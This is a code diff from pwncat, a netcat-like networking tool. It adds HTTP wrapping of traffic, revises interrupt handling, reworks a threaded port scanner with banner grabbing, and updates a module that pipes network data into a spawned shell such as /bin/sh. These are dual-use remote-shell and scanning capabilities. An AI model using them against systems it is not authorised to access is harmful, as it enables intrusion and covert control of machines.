+        # type: (Dict[str, str]) -> None
+        """Set specific options for this transformer.
+
+        Args:
+            opts (DsTransformLinefeed): Transformer options.
+
+        """
+        super(TransformHttpPack, self).__init__()
+        self.__opts = opts
+        self.__log = logging.getLogger(__name__)
+
+        assert "reply" in opts
+        assert opts["reply"] in ["request", "response"]
+
+        # Initial default header
+        self.__headers = [
+            "Accept-Charset: utf-8",
+        ]
+
+        self.__response_headers_sent = False
+
+    # --------------------------------------------------------------------------
+    # Public Functions
+    # --------------------------------------------------------------------------
+    def transform(self, data):
+        # type: (bytes) -> bytes
+        """Wrap data into a HTTP packet.
+
+        Returns:
+            bytes: The wrapped string.
+        """
+        request_header = [
+            "POST / HTTP/1.1",
+            "Host: {}".format(self.__opts["host"]),
+            "User-Agent: pwncat",
+            "Accept: */*",
+            "Conent-Length: {}".format(len(data)),
+            "Content-Type: text/plain; charset=UTF-8",
+        ]
+        response_header = [
+            "HTTP/1.1 200 OK",
+            "Date: {}".format(self.__get_date()),
+            "Server: pwncat",
+            "Conent-Length: {}".format(len(data)),
+            "Connection: close",
+        ]
+
+        self.__response_headers_sent = True
+
+        if self.__opts["reply"] == "request":
+            header = StringEncoder.encode(
+                "\n".join(request_header) + "\n" + "\n".join(self.__headers) + "\n\n"
+            )
+        else:
+            header = StringEncoder.encode(
+                "\n".join(response_header) + "\n" + "\n".join(self.__headers) + "\n\n"
+            )
+        return header + data
+
+    # --------------------------------------------------------------------------
+    # Private Functions
+    # --------------------------------------------------------------------------
+    def __get_date(self):  # pylint: disable=no-self-use
+        # type: () -> str
+        now = datetime.utcnow()
+        weekday = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"][now.weekday()]
+        month = [
+            "Jan",
+            "Feb",
+            "Mar",
+            "Apr",
+            "May",
+            "Jun",
+            "Jul",
+            "Aug",
+            "Sep",
+            "Oct",
+            "Nov",
+            "Dec",
+        ][now.month - 1]
+        return "%s, %02d %s %04d %02d:%02d:%02d GMT" % (
+            weekday,
+            now.day,
+            month,
+            now.year,
+            now.hour,
+            now.minute,
+            now.second,
+        )
+
+
+# -------------------------------------------------------------------------------------------------
+# [5/11 TRANSFORM]: (5/5) TransformHttpUnpack
+# -------------------------------------------------------------------------------------------------
+class TransformHttpUnpack(Transform):
+    """Implement a transformation to unpack data from HTTP packets."""
+
+    # --------------------------------------------------------------------------
+    # Constructor / Destructor
+    # --------------------------------------------------------------------------
+    def __init__(self, opts):
+        # type: (Dict[str, str]) -> None
+        """Set specific options for this transformer.
+
+        Args:
+            opts (DsTransformLinefeed): Transformer options.
+
+        """
+        super(TransformHttpUnpack, self).__init__()
+        self.__opts = opts
+        self.__log = logging.getLogger(__name__)
+
+    # --------------------------------------------------------------------------
+    # Public Functions
+    # --------------------------------------------------------------------------
+    def transform(self, data):
+        # type: (bytes) -> bytes
+        """Unwrap data from a HTTP packet.
+
+        Returns:
+            str: The wrapped string.
+        """
+        request = StringEncoder.encode(r"^(GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH)")
+        response = StringEncoder.encode(r"^HTTP/[.0-9]+")
+
+        # Did not receive a valid HTTP request, so we return the original untransformed message
+        if not (re.match(request, data) or re.match(response, data)):
+            return data
+
+        body = StringEncoder.encode(r"(\r\n\r\n|\n\n)(.*)")
+        match = re.search(body, data)
+
+        # Check if we can separate headers and body
+        if match is None or len(match.group()) < 2:
+            return data
+        return match.group(2)
 
 
 # #################################################################################################
@@ -2445,8 +2688,8 @@ class IO(ABC):  # type: ignore
     # --------------------------------------------------------------------------
     @property
     def ssig(self):
-        # type: () -> StopSignal
-        """`StopSignal`: Read only property to provide a StopSignal instance to IO."""
+        # type: () -> InterruptHandler
+        """`InterruptHandler`: InterruptHandler instance."""
         return self.__ssig
 
     @property
@@ -2460,11 +2703,11 @@ class IO(ABC):  # type: ignore
     # --------------------------------------------------------------------------
     @abstractmethod
     def __init__(self, ssig):
-        # type: (StopSignal) -> None
+        # type: (InterruptHandler) -> None
         """Set specific options for this IO module.
 
         Args:
-            ssig (StopSignal): StopSignal instance used by the interrupter.
+            ssig (InterruptHandler): InterruptHandler instance used by the interrupter.
         """
         super(IO, self).__init__()
         self.__ssig = ssig
@@ -2475,7 +2718,7 @@ class IO(ABC):  # type: ignore
     # --------------------------------------------------------------------------
     @abstractmethod
     def producer(self, *args, **kwargs):
-        # type: (Any, Any) -> Iterator[str]
+        # type: (Any, Any) -> Iterator[bytes]
         """Implement a generator function which constantly yields data.
 
         The data could be from various sources such as: received from a socket,
@@ -2487,7 +2730,7 @@ class IO(ABC):  # type: ignore
 
     @abstractmethod
     def consumer(self, data):
-        # type: (str) -> None
+        # type: (bytes) -> None
         """Define a consumer callback which will apply an action on the producer output.
 
         Args:
@@ -2502,8 +2745,6 @@ class IO(ABC):  # type: ignore
         Various producer might call blocking functions and they won't be able to stop themself
         as they hang on that blocking function.
         NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.
-
-        You should at least implement it with "self.ssig.raise_stop()"
         """
 
 
@@ -2513,12 +2754,18 @@ class IO(ABC):  # type: ignore
 class IONetwork(IO):
     """Pwncat implementation based on custom Socket library."""
 
+    @property
+    def net(self):
+        # type: () -> Net
+        """Returns instance of Net."""
+        return self.__net
+
     # --------------------------------------------------------------------------
     # Constructor / Destructor
     # --------------------------------------------------------------------------
     def __init__(
         self,
-        ssig,  # type: StopSignal
+        ssig,  # type: InterruptHandler
         encoder,  # type: StringEncoder
         host,  # type: str
         ports,  # type: List[int]
@@ -2531,7 +2778,7 @@ class IONetwork(IO):
         """Create a Pwncat instance of either a server or a client.
 
         Args:
-            ssig (StopSignal): Stop signal instance
+            ssig (InterruptHandler): Instance of InterruptHandler.
             encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
             host (str): The hostname to resolve.
             ports ([int]): List of ports to connect to or listen on.
@@ -2548,6 +2795,9 @@ class IONetwork(IO):
         self.__sock_opts = sock_opts
         self.__srv_opts = srv_opts
         self.__cli_opts = cli_opts
+
+        # Did we already run cleanup
+        self.__cleaned_up = False
 
         # Internally store addresses for reconn or rebind functions
         self.__host = host
@@ -2567,7 +2817,7 @@ class IONetwork(IO):
     # Public Functions
     # --------------------------------------------------------------------------
     def producer(self, *args, **kwargs):
-        # type: (Any, Any) -> Iterator[str]
+        # type: (Any, Any) -> Iterator[bytes]
         """Network receive generator which hooks into the receive function and adds features.
 
         Yields:
@@ -2583,9 +2833,16 @@ class IONetwork(IO):
             try:
                 yield self.__net.receive()
             # [2/3] Non-blocking socket is finished receiving data and allows us to do some action
-            except socket.timeout:
+            except socket.timeout as err:
+                # Check if we close the socket for sending
+                if self.ssig.has_sock_send_eof():
+                    self.log.trace(  # type: ignore
+                        "SOCK-SEND-EOF signal ACK in IONetwork.producer [1]: %s", err
+                    )
+                    self.__net.send_eof()
+
                 # Let's ask the interrupter() function if we should terminate?
-                if not self.ssig.has_stop():
+                if not self.ssig.has_sock_quit():
                     continue
                 # Stop signal is raied when my own side of the network was closed.
                 # Happened most likely that the user pressed Ctrl+c
@@ -2600,12 +2857,19 @@ class IONetwork(IO):
                     curr_recv_timeout_retry += 1
                     continue
                 # We ware all done reading, shut down
-                self.ssig.raise_stop()
+                self.log.trace(  # type: ignore
+                    "SOCK-QUIT signal ACK in IONetwork.producer [1]: %s", err
+                )
+                self.__cleanup()
                 return
-            # [3/3] Upstream is gone
-            except (EOFError, AttributeError, socket.error):
+            # [3/3] Connection was closed remotely (EOF) or locally (Ctrl+C or similar)
+            except (EOFError, AttributeError, socket.error) as err:
                 # Do we have a stop signal?
-                if self.ssig.has_stop():
+                if self.ssig.has_sock_quit():
+                    self.log.trace(  # type: ignore
+                        "SOCK-QUIT signal ACK in IONetwork.producer [2]: %s", err
+                    )
+                    self.__cleanup()
                     return
                 # Do we re-accept new clients?
                 if self.__sock_opts.udp:
@@ -2615,27 +2879,37 @@ class IONetwork(IO):
                     continue
                 if self.__role == "client" and self.__client_reconnect_to_server():
                     continue
-                return
+                # Inform everybody that we are quitting
+                self.log.trace("SOCK-EOF signal RAISE in IONetwork.producer")  # type: ignore
+                self.ssig.raise_sock_eof()
 
     def consumer(self, data):
-        # type: (str) -> None
+        # type: (bytes) -> None
         """Send data to a socket."""
-        self.__net.send(data)
+        try:
+            self.__net.send(data)
+        except socket.error:
+            pass
 
     def interrupt(self):
         # type: () -> None
         """Stop function that can be called externally to close this instance."""
-        self.log.trace(  # type: ignore
-            "[IONetwork] socket.close was raised by calling interrupt() externally."
-        )
-        self.__net.close_conn_sock()
-        self.__net.close_bind_sock()
-        # Raise stop signal
-        self.ssig.raise_stop()
+        self.log.trace("SOCK-QUIT signal RAISE in IONetwork.interrupt")  # type: ignore
+        self.ssig.raise_sock_quit()
+        self.__cleanup()
 
     # --------------------------------------------------------------------------
     # Private Functions
     # --------------------------------------------------------------------------
+    def __cleanup(self):
+        # type: () -> None
+        """Cleanup function."""
+        if not self.__cleaned_up:
+            self.log.trace("SOCK-QUIT-CLEANUP: Closing sockets")  # type: ignore
+            self.__net.close_conn_sock()
+            self.__net.close_bind_sock()
+            self.__cleaned_up = True
+
     def __client_reconnect_to_server(self):
         # type: () -> bool
         """Ensure the client re-connects to the remote server, if the remote server hang up.
@@ -2648,13 +2922,14 @@ class IONetwork(IO):
         # reconn < 0 (endlessly)
         # reconn > 0 (reconnect until counter reaches zero)
         while self.__cli_opts.reconn != 0:
-
             # [1/6] Let's ask the interrupter() function if we should terminate?
             # We need a little wait here in order for the stop signal to propagate.
             # Don't know how fast the other threads are.
-            # time.sleep(0.1)
-            # if self.ssig.has_stop():
-            #     return False
+            if self.ssig.has_sock_quit():
+                self.log.trace(  # type: ignore
+                    "SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [1]"
+                )
+                return False
 
             # [2/6] Wait
             time.sleep(self.__cli_opts.reconn_wait)
@@ -2662,7 +2937,10 @@ class IONetwork(IO):
             # [3/6] Let's ask the interrupter() function if we should terminate?
             # In case the other threads were slower as the sleep time in [1/5]
             # we will check again here.
-            if self.ssig.has_stop():
+            if self.ssig.has_sock_quit():
+                self.log.trace(  # type: ignore
+                    "SOCK-QUIT signal ACK in IONetwork.__clienet_reconnect_to_server [2]"
+                )
                 return False
 
             # [4/6] Increment the port numer (if --reconn-robin has multiple)
@@ -2706,7 +2984,10 @@ class IONetwork(IO):
         while self.__srv_opts.rebind != 0:
 
             # [1/7] Let's ask the interrupter() function if we should terminate?
-            if self.ssig.has_stop():
+            if self.ssig.has_sock_quit():
+                self.log.trace(  # type: ignore
+                    "SOCK-QUIT signal ACK in IONetwork.__server_rebind [1]"
+                )
                 return False
 
             # [2/7] Increment the port numer (if --reconn-robin has multiple)
@@ -2739,7 +3020,10 @@ class IONetwork(IO):
             # [6/7] Let's ask the interrupter() function if we should terminate?
             # In case the other threads were slower as the sleep time in [1/7]
             # we will check again here.
-            if self.ssig.has_stop():
+            if self.ssig.has_sock_quit():
+                self.log.trace(  # type: ignore
+                    "SOCK-QUIT signal ACK in IONetwork.__server_rebind [2]"
+                )
                 return False
 
             # [6/7] Recurse until True or reconnect count is used up
@@ -2768,9 +3052,12 @@ class IONetwork(IO):
 
         # [MAYBE] Check stop signal and otherwise try until success.
         while True:
-            time.sleep(0.1)
+            time.sleep(0.01)
             # [NO] We have a stop signal
-            if self.ssig.has_stop():
+            if self.ssig.has_sock_quit():
+                self.log.trace(  # type: ignore
+                    "SOCK-QUIT signal ACK in IONetwork.__server_reaccept_from_client"
+                )
                 return False
             # [YES] Re-accept indefinitely
             self.log.info("Re-accepting new clients")
@@ -2811,7 +3098,7 @@ class IONetworkScanner(IO):
     # --------------------------------------------------------------------------
     def __init__(
         self,
-        ssig,  # type: StopSignal
+        ssig,  # type: InterruptHandler
         encoder,  # type: StringEncoder
         host,  # type: str
         banner,  # type: bool
@@ -2822,7 +3109,7 @@ class IONetworkScanner(IO):
         """Create a Pwncat Network Scanner instance.
 
         Args:
-            ssig (StopSignal): Stop signal instance
+            ssig (InterruptHandler): Instance of InterruptHandler.
             encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
             host (str): The hostname to resolve.
             banner (bool): Determines if we do banner grabbing as well.
@@ -2831,19 +3118,19 @@ class IONetworkScanner(IO):
         """
         super(IONetworkScanner, self).__init__(ssig)
 
+        self.__ssig = ssig
         self.__enc = encoder
         self.__cli_opts = cli_opts
         self.__sock_opts = sock_opts
         self.__banner = banner
 
         self.__log = logging.getLogger(__name__)
-        self.__net = Net(encoder, ssig, sock_opts)
         self.__sock = Sock()
         self.__screen_lock = threading.Semaphore()
 
         # Keep track of local binds (addr-port) of the threaded scanner
         # clients as we do not want to treat them as open ports (false posistives)
-        self.__local_binds = []  # type: List[str]
+        self.__local_binds = {}  # type: Dict[str, socket.socket]
 
         # Compile our regexes if using banner detection
         if banner:
@@ -2861,13 +3148,13 @@ class IONetworkScanner(IO):
                 int(socket.AF_INET),
             ]
         self.__targets = {}
-        try:
-            for family in families:
+        for family in families:
+            try:
                 self.__targets[family] = self.__sock.gethostbyname(
                     host, family, not self.__sock_opts.nodns
                 )
-        except socket.gaierror:
-            pass
+            except socket.gaierror:
+                pass
 
     # --------------------------------------------------------------------------
     # Public Functions
@@ -2875,18 +3162,24 @@ class IONetworkScanner(IO):
     def __get_socket(self, family):
         # type: (Union[socket.AddressFamily, int]) -> socket.socket
         """Create socket for specific address family endlessly until resources are available."""
-        # The scanner is starting many threads, each creating a single socket
-        # and we might hit the max allowed open files limit, so we will
-        # endlessly ask the system for a new socket until success.
-        # Also adding a delay, which will give other threads the time to
-        # release their sockets.
+        # The scanner starts one thread for each port to scan. Each thread will also create
+        # one socket and we might hit the max_allowed_files limit (ulimit).
+        # That's why we loop through creating sockets until we hit a success
+        # as in the meantime, other threads might have already released sockets/fd's.
         while True:
+            delay = 0.0
+            if self.__ssig.has_terminate():
+                self.log.trace(  # type: ignore
+                    "TERMINATE signal ACK for IONetworkScanner._getsocket"
+                )
+                raise socket.error("quit")
             try:
                 if self.__sock_opts.udp:
-                    return self.__sock.create_socket(family, socket.SOCK_DGRAM)
-                return self.__sock.create_socket(family, socket.SOCK_STREAM)
+                    return self.__sock.create_socket(family, socket.SOCK_DGRAM, False)
+                return self.__sock.create_socket(family, socket.SOCK_STREAM, False)
             except socket.error:
-                time.sleep(0.1)
+                delay += 0.1
+                time.sleep(delay)  # This can be bigger to give the system some time to release fd's
 
     def __get_banner_version(self, banner):
         # type: (str) -> Optional[str]
@@ -2903,7 +3196,7 @@ class IONetworkScanner(IO):
         for reg in self.BANNER_REG_COMP:
             match = re.search(reg, banner)
             if match:
-                return match.group(1).rstrip()
+                return StringEncoder.rstrip(match.group(1))  # type: ignore
 
         # Nothing found, return first non-empty line
         for line in lines:
@@ -2922,25 +3215,30 @@ class IONetworkScanner(IO):
             payloads = self.BANNER_PAYLOADS[0]
 
         for payload in payloads:
+            # Break the loop on terminate signal
+            if self.__ssig.has_terminate():
+                self.log.trace(  # type: ignore
+                    "TERMINATE signal ACK for IONetworkScanner._getbanner: %s-%d", addr, port
+                )
+                return (False, None)
             try:
                 if payload is not None:
                     sock.send(self.__enc.encode(payload))
                     self.__log.debug("%s:%d - payload sent: %s", addr, port, repr(payload))
 
-                sock.settimeout(0.1)
+                sock.settimeout(0.5)
                 banner = sock.recv(self.__sock_opts.bufsize)
                 version = self.__get_banner_version(self.__enc.decode(banner))
                 self.__log.debug("%s:%d - respone received: %s", addr, port, repr(banner))
                 return (True, version)
             except socket.timeout:
-                time.sleep(0.1)
                 continue
             except (OSError, socket.error):
                 return (False, None)
         return (True, None)
 
     def producer(self, *args, **kwargs):
-        # type: (Any, Any) -> Iterator[str]
+        # type: (Any, Any) -> Iterator[bytes]
         """Port scanner yielding open/closed string for given port.
 
         Args:
@@ -2955,13 +3253,25 @@ class IONetworkScanner(IO):
         # Loop over adress families
         for family in self.__targets:
 
+            # [1/7] Check for termination request
+            if self.__ssig.has_terminate():
+                self.log.trace(  # type: ignore
+                    "TERMINATE signal ACK for IONetworkScanner.producer"
+                )
+                return
+
             addr = self.__targets[family]
 
-            # [1/5] Get socket
-            sock = self.__get_socket(family)
+            # [2/7] Get socket
+            try:
+                sock = self.__get_socket(family)
+                sock_type = sock.type
+            except (AttributeError, socket.error):
+                # Exception is triggered due to stop stignal and we
+                # will abort here in that case.
+                return
 
-            # [2/5] Connect scan
-            succ_conn = False
+            # [3/7] Connect scan
             try:
                 laddr, lport = self.__sock.connect(
                     sock,
@@ -2975,64 +3285,78 @@ class IONetworkScanner(IO):
                     0.1,
                 )
                 # Append local binds (addr-port) to check against during port scan
-                self.__local_binds.append(str(laddr + "-" + str(lport)))
-                succ_conn = True
+                key = str(laddr + "-" + str(lport))
+                self.__local_binds[key] = sock
             except socket.error:
-                succ_conn = False
+                self.__sock.close(sock, "[-] closed: {}:{}".format(addr, port))
+                continue
 
-            # [3/5] Banner grabbing
+            # [4/7] False positives
+            # Connect was successful, but against a local bind of one of our
+            # port scanners, so this is a false positive.
+            if str(addr + "-" + str(port)) in self.__local_binds:
+                self.__sock.close(sock, "[-] closed: {}:{}".format(addr, port))
+                del self.__local_binds[key]
+                continue
+
+            # [5/7] Banner grabbing
             succ_banner = True
             banner = None
             if self.__banner:
                 (succ_banner, banner) = self.__get_banner(sock, addr, port)
 
-            # [4/5] Evaluation
-            if banner is not None and (succ_conn and succ_banner):
-                if str(addr + "-" + str(port)) not in self.__local_binds:
-                    sock_type = sock.type
-                    yield "[+] {:>5}/{} open   ({}): {}".format(
-                        port,
-                        self.__sock.get_type_name(sock_type),
-                        self.__sock.get_family_name(family),
-                        banner,
-                    )
-            if banner is None and (succ_conn and succ_banner):
-                if str(addr + "-" + str(port)) not in self.__local_binds:
-                    sock_type = sock.type
-                    yield "[+] {:>5}/{} open   ({})".format(
-                        port,
-                        self.__sock.get_type_name(sock_type),
-                        self.__sock.get_family_name(family),
-                    )
+            # [6/7] Evaluation
+            if banner is not None and succ_banner:
+                msg = "[+] {:>5}/{} open   ({}): {}".format(
+                    port,
+                    self.__sock.get_type_name(sock_type),
+                    self.__sock.get_family_name(family),
+                    banner,
+                )
+                yield self.__enc.encode(msg)
+            if banner is None and succ_banner:
+                msg = "[+] {:>5}/{} open   ({})".format(
+                    port, self.__sock.get_type_name(sock_type), self.__sock.get_family_name(family),
+                )
+                yield self.__enc.encode(msg)
 
-            # [5/5] Cleanup
-            self.__sock.close(sock, addr + "-" + str(port))
-            try:
-                self.__local_binds.remove(str(addr + "-" + str(port)))
-            except ValueError:
-                pass
+            # [7/7] Cleanup
+            self.__sock.close(sock, key)
+            del self.__local_binds[key]
 
     def consumer(self, data):
-        # type: (str) -> None
+        # type: (bytes) -> None
         """Print received data to stdout."""
         # For issues with flush (when using tail -F or equal) see links below:
         # https://stackoverflow.com/questions/26692284
         # https://docs.python.org/3/library/signal.html#note-on-sigpipe
         self.__screen_lock.acquire()
-        print(data)
+        print(StringEncoder.decode(data))
         try:
             sys.stdout.flush()
-        except (BrokenPipeError, IOError):
+        except IOError:
             # Python flushes standard streams on exit; redirect remaining output
-            # to devnull to avoid another BrokenPipeError at shutdown
+            # to devnull to avoid another broken pipe at shutdown
             devnull = os.open(os.devnull, os.O_WRONLY)
             os.dup2(devnull, sys.stdout.fileno())
         finally:
             self.__screen_lock.release()
 
     def interrupt(self):
-        # type: (str) -> None
-        """Not required."""
+        # type: () -> None
+        """Stop function that can be called externally to close this instance."""
+        self.log.trace("SOCK-QUIT signal RAISED in IONetworkScanner.interrupt")  # type: ignore
+        self.ssig.raise_sock_quit()
+
+        # NOTE: Closing up to 65535 sockets (single thread) takes very very long
+        # Se we leave this up to Python itself, once the program exits.
+        # self.log.trace("SOCK-QUIT-CLEANUP: Closing sockets")  # type: ignore
+        # # Double loop to prevent: Dictionary size changed during iteration
+        # remove = {}
+        # for key in self.__local_binds:
+        #     remove[key] = self.__local_binds[key]
+        # for key in remove:
+        #     self.__sock.close(remove[key], key)
 
 
 # -------------------------------------------------------------------------------------------------
@@ -3050,34 +3374,45 @@ class IOStdinStdout(IO):
     # Constructor / Destructor
     # --------------------------------------------------------------------------
     def __init__(self, ssig, opts):
-        # type: (StopSignal, DsIOStdinStdout) -> None
+        # type: (InterruptHandler, DsIOStdinStdout) -> None
         """Set specific options for this I/O module.
 
         Args:
-            ssig (StopSignal): StopSignal instance.
+            ssig (InterruptHandler): InterruptHandler instance.
             opts (DsIOStdinStdout): IO options.
         """
         super(IOStdinStdout, self).__init__(ssig)
         self.__opts = opts
         self.__py3 = sys.version_info >= (3, 0)  # type: bool
         self.__win = os.name != "posix"  # posix or nt
+        self.__stdout_isatty = sys.stdout.isatty()
+        self.__stdin_isatty = sys.stdin.isatty()
+
+        self.log.debug("STDOUT isatty: %s", self.__stdout_isatty)
+        self.log.debug("STDIN  isatty: %s", self.__stdin_isatty)
+        self.log.debug("STDIN  posix:  %s (%s)", str(self.__win), os.name)
 
     # --------------------------------------------------------------------------
     # Public Functions
     # --------------------------------------------------------------------------
     def producer(self, *args, **kwargs):
-        # type: (Any, Any) -> Iterator[str]
+        # type: (Any, Any) -> Iterator[bytes]
         """Constantly ask for user input.
 
         Yields:
             str: Data read from stdin.
         """
+        # On --send-on-eof we will return all of its contents at once:
+        lines = []
+
         # https://stackoverflow.com/questions/1450393/#38670261
         # while True: line = sys.stdin.readline() <- reads a whole line (faster)
         # for line in sys.stdin.readlin():        <- reads one byte at a time
         while True:
-            if self.ssig.has_stop():
-                self.log.trace("Stop signal acknowledged for reading STDIN-1")  # type: ignore
+            if self.ssig.has_stdin_quit():
+                self.log.trace(  # type: ignore
+                    "STDIN-QUIT signal ACK in IOStdinStdout.producer [1]"
+                )
                 return
             try:
                 data = self.__read_stdin()
@@ -3085,45 +3420,53 @@ class IOStdinStdout(IO):
                 # When using select() with timeout, we don't have any input
                 # at this point and simply continue the loop or quit if
                 # a terminate request has been made by other threads.
-                if self.ssig.has_stop():
-                    self.log.trace("Stop signal acknowledged for reading STDIN-2")  # type: ignore
+                if self.ssig.has_stdin_quit():
+                    self.log.trace(  # type: ignore
+                        "STDIN-QUIT signal ACK in IOStdinStdout.producer [2]"
+                    )
                     return
                 continue
             if data:
                 self.log.debug("Received %d bytes from STDIN", len(data))
                 self.log.trace("Received: %s", repr(data))  # type: ignore
-                yield data
+                # [send-on-eof] Append data
+                if self.__opts.send_on_eof:
+                    lines.append(data)
+                else:
+                    yield data
             # EOF or <Ctrl>+<d>
             else:
-                # DO NOT RETURN HERE BLINDLY, THE UPSTREAM CONNECTION MUST GO FIRST!
-                if self.ssig.has_stop():
-                    self.log.trace("Stop signal acknowledged for reading STDIN-3")  # type: ignore
-                    return
+                # [send-on-eof] Dump data before quitting
+                if lines and self.__opts.send_on_eof:
+                    yield StringEncoder.encode("").join(lines)
+                self.log.trace("STDIN-EOF signal RAISE in IOStdinStdout.producer")  # type: ignore
+                self.ssig.raise_stdin_eof()
 
     def consumer(self, data):
-        # type: (str) -> None
+        # type: (bytes) -> None
         """Print received data to stdout."""
-        # For issues with flush (when using tail -F or equal) see links below:
-        # https://stackoverflow.com/questions/26692284
-        # https://docs.python.org/3/library/signal.html#note-on-sigpipe
-        print(data, end="")
+        if self.__py3:
+            sys.stdout.buffer.write(data)
+        else:
+            # For issues with flush (when using tail -F or equal) see links below:
+            # https://stackoverflow.com/questions/26692284
+            # https://docs.python.org/3/library/signal.html#note-on-sigpipe
+            print(data, end="")
+
         try:
             sys.stdout.flush()
-        except (BrokenPipeError, IOError):
+        except IOError:
             # Python flushes standard streams on exit; redirect remaining output
-            # to devnull to avoid another BrokenPipeError at shutdown
+            # to devnull to avoid another broken pipe at shutdown
             devnull = os.open(os.devnull, os.O_WRONLY)
             os.dup2(devnull, sys.stdout.fileno())
 
     def interrupt(self):
         # type: () -> None
         """Stop function that can be called externally to close this instance."""
-        self.log.trace(  # type: ignore
-            "[IOStdinStdout] interrupt() invoked"
-        )
-        # Raise stop signal
-        # TODO: Check if this is required???
-        self.ssig.raise_stop()
+        # TODO: Does not work on windows as it has blocking read of stdin
+        self.log.trace("STDIN-QUIT signal RAISE in IOStdinStdout.interrupt")  # type: ignore
+        self.ssig.raise_stdin_quit()
 
     # --------------------------------------------------------------------------
     # Private Functions
@@ -3159,37 +3502,33 @@ class IOStdinStdout(IO):
         return mode[tty.LFLAG] != (mode[tty.LFLAG] | termios.ICANON)  # type: ignore
 
     def __read_stdin(self):
-        # type: () -> str
+        # type: () -> bytes
         """Returns input from STDIN."""
-        # (Windows)
+        # [1/3] (Windows) Normal/Raw mode
         if self.__win:
+            if self.__py3:
+                return sys.stdin.buffer.read()
             # Python 2 on Windows opens sys.stdin in text mode, and
             # binary data that read from it becomes corrupted on \r\n.
             # Setting sys.stdin to binary mode fixes that.
-            if not self.__py3:
-                if hasattr(os, "O_BINARY"):
-                    msvcrt.setmode(  # type: ignore
-                        sys.stdin.fileno(), os.O_BINARY,  # pylint: disable=no-member
-                    )
-            return sys.stdin.readline()
+            if hasattr(os, "O_BINARY"):
+                msvcrt.setmode(  # type: ignore
+                    sys.stdin.fileno(), os.O_BINARY,  # pylint: disable=no-member
+                )
+            return sys.stdin.read()  # type: ignore
 
-        # (Linux/Mac) Raw mode
+        # [2/3] (Linux/Mac) Raw mode
         if self.__stdin_israw():
             self.__set_input_timeout()
-            return sys.stdin.read(1)
-            # if self.__py3:
-            #      return sys.stdin.buffer.read(1)  # (bytes)
-            #     return sys.stdin.read(1)
-            # else:
-            #     return sys.stdin.read(1)
+            if self.__py3:
+                return sys.stdin.buffer.read(1)
+            return sys.stdin.read(1)  # type: ignore
 
-        # (Linux/Mac) Normal mode
+        # [3/3] (Linux/Mac) Normal mode
         self.__set_input_timeout()
-        return sys.stdin.readline()
-        # if self.__py3:
-        #     return sys.stdin.buffer.readline()  # (bytes)
-        # else:
-        #     return sys.stdin.readline()
+        if self.__py3:
+            return sys.stdin.buffer.readline()
+        return sys.stdin.readline()  # type: ignore
 
 
 # -------------------------------------------------------------------------------------------------
@@ -3206,19 +3545,25 @@ class IOCommand(IO):
     # Constructor / Destructor
     # --------------------------------------------------------------------------
     def __init__(self, ssig, opts):
-        # type: (StopSignal, DsIOCommand) -> None
+        # type: (InterruptHandler, DsIOCommand) -> None
         """Set specific options for this I/O module.
 
         Args:
-            ssig (StopSignal): Instance of StopSignal.
+            ssig (InterruptHandler): Instance of InterruptHandler.
             opts (DsIOCommand): Custom module options.
         """
         super(IOCommand, self).__init__(ssig)
         self.__opts = opts
         self.log.debug("Setting '%s' as executable", self.__opts.executable)
 
-        # Define destructor
-        atexit.register(self.__destruct__)
+        # Did we already run cleanup
+        self.__cleaned_up = False
+
+        # If we receive only one byte at a time, the remote end is most likely
+        # in raw mode and we will also start sending one byte at a time.
+        # This will be determined in the consumer and action is taken in
+        # the producer.
+        self.__remote_is_raw = False
 
         # Open executable to wait for commands
         env = os.environ.copy()
@@ -3240,19 +3585,11 @@ class IOCommand(IO):
             self.log.error("Specified executable '%s' not found", self.__opts.executable)
             sys.exit(1)
 
-    def __destruct__(self):
-        # type: () -> None
-        """Destructor."""
-        self.log.trace(  # type: ignore
-            "Killing executable: %s with pid %d", self.__opts.executable, self.proc.pid
-        )
-        self.proc.kill()
-
     # --------------------------------------------------------------------------
     # Public Functions
     # --------------------------------------------------------------------------
     def producer(self, *args, **kwargs):
-        # type: (Any, Any) -> Iterator[str]
+        # type: (Any, Any) -> Iterator[bytes]
         """Constantly ask for input.
 
         Yields:
@@ -3260,43 +3597,80 @@ class IOCommand(IO):
         """
         assert self.proc.stdout is not None
         while True:
-            if self.ssig.has_stop():
-                self.log.trace("Stop signal acknowledged in Command")  # type: ignore
+            if self.ssig.has_command_quit():
+                self.log.trace("COMMAND-QUIT signal ACK IOCommand.producer (1)")  # type: ignore
+                self.__cleanup()
                 return
             self.log.trace("Reading command output")  # type: ignore
             # Byte-wise reading is required to make it work for remote ends being in raw mode
             # However, the performance of self.proc.stdout.readline() is way faster.
             # To improve performance we will get rid of all other logging calls here.
-            data = self.proc.stdout.read(1)
+            if self.__remote_is_raw:
+                data = self.proc.stdout.read(1)
+            else:
+                data = self.proc.stdout.readline()
             self.log.trace("Command output: %s", repr(data))  # type: ignore
             if not data:
-                self.log.trace("Command output was empty. Exiting loop.")  # type: ignore
-                break
-            yield self.__opts.enc.decode(data)
+                if self.ssig.has_command_quit():
+                    self.log.trace("COMMAND-QUIT signal ACK IOCommand.producer (2)")  # type: ignore
+                    self.__cleanup()
+                    return
+                # This usually happens when sending a semicolon only to /bin/[ba]sh
+                # which then responds with: /bin/sh: line 5: syntax error near unexpected token `;'
+                # Afterwards the shell is corrupt and gone so we will restart it here.
+                self.log.error("COMMAND-EOF restarting: %s", self.__opts.executable)
+                self.proc = Popen(
+                    self.__opts.executable,
+                    stdin=PIPE,
+                    stdout=PIPE,
+                    stderr=STDOUT,
+                    bufsize=self.__opts.bufsize,
+                    shell=False,
+                    env=os.environ.copy(),
+                )
+                continue
+            yield data
 
     def consumer(self, data):
-        # type: (str) -> None
+        # type: (bytes) -> None
         """Send data received to stdin (command input).
 
         Args:
             data (str): Command to execute.
         """
+        # If we only receive one byte at a time, also tell the consumer
+        # to send one byte at a time immediately and not to wait for a full line.
+        if len(data) == 1:
+            self.__remote_is_raw = True
+        else:
+            self.__remote_is_raw = False
+
         assert self.proc.stdin is not None
-        byte = self.__opts.enc.encode(data)
-        self.log.trace("Appending to stdin: %s", repr(byte))  # type: ignore
-        self.proc.stdin.write(byte)
-        self.proc.stdin.flush()
+        self.log.trace("Appending to stdin: %s", repr(data))  # type: ignore
+        try:
+            self.proc.stdin.write(data)
+            self.proc.stdin.flush()
